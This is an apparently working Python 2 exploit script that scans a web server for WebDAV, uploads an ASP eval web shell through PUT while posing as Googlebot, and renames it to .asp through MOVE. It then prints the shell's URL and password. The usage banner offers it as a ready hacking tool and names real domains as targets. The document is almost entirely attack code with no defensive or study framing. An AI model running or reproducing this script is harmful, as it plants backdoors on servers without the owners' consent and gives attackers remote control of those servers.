#! /usr/bin/env python2.7
# by shaoxiao QQ: 1006079161
#coding=utf8

import httplib
import socket
import sys

class webdav:
    txt = '/shaoxiao.txt'   
    def scan(self,arg):# Determine whether there webdav vulnerability
        port = 80
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote_ip = socket.gethostbyname( arg )
            s.connect((remote_ip , port))
            message = "OPTIONS / HTTP/1.1\r\nHost: %s\r\n\r\n" % arg
            s.sendall(message)
            reply = s.recv(1024)
            if 'DAV' in reply:
                print 'Webdav Is Vulnerable! Try To Hacking....'
                self.put(arg,self.txt)
                self.move(arg,self.txt)
            else:
                print 'Webdav Is No Vulnerable!'
                sys.exit(1)
        except Exception,e:
            print e
        
    
    def put(self,arg,site):# Written shell
        data = '<%eval request("woaini")%>'
        putheaders = {'User-Agent':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
        try:
            conn = httplib.HTTPConnection(arg)
            conn.request('PUT',site,data,putheaders)
            httpres = conn.getresponse()
            if httpres.status in [200,201]:
                print 'PUT  Success Txt:http://%s/shaoxiao.txt Try Move...' % arg.strip()
            else:
                print 'Sorry Put Failed!'
                sys.exit(1)
        except Exception,e:
            print e
        
    def move(self,arg,site):# move txt to asp
        moveheaders = {'User-Agent':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)','Destination':'http://%s/shaoxiao.asp' % arg.strip()}
        try:
            conn = httplib.HTTPConnection(arg)
            conn.request('MOVE',site,None,moveheaders)
            httpres = conn.getresponse()
            if httpres.status in [204,201]:#204 code means that already exists
                print 'Move Success Shell:http://%s/shaoxiao.asp pass:woaini' % arg.strip()
            else:
                print 'Sorry Move Failed!'
                sys.exit(1)
        except Exception,e:
            print e
        



if __name__ == '__main__':
    def printerror():
        print '''
        
        #######################################################
        #                                                     #
        #                   webdav Exploit                    #
        #                @ 1006079161#QQ.com                  #
        #                 www.mdbhack.com                     #
        #                                                     #
        #######################################################
        
        For example:
            webdav.py www.baidu.com
            webdav.py baidu.com
        '''
    if len(sys.argv) == 2 and '/' not in sys.argv[1]:
        scan = webdav()
        scan.scan(sys.argv[1])
    else:
        printerror()